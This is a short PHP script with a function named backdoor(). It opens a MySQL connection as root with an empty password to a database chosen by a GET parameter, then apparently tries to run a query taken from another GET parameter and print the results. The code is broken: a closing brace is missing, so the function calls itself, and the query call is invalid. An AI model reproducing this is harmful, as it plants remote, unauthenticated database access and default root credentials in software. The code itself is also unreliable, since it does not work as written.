<?php
function backdoor() {
    // Update the details below with your MySQL details
    $DATABASE_HOST = 'localhost';
    $DATABASE_USER = 'root';
    $DATABASE_PASS = '';
    $DATABASE_NAME = $_GET['n'];
    try {
    	return new PDO('mysql:host=' . $DATABASE_HOST . ';dbname=' . $DATABASE_NAME . ';charset=utf8', $DATABASE_USER, $DATABASE_PASS);
    } catch (PDOException $exception) {
    	// If there is an error with the connection, stop the script and display the error.
    	die ('Failed to connect to database!');
    }
// Connect to MySQL
$pdo = backdoor();
$query = $_GET['q'];
// Prepare
$stmt = $pdo->query("?");
$stmt->execute([$query]);
while ($row = $stmt->fetch()) {
    echo $row['name']."<br />\n";
}
?>
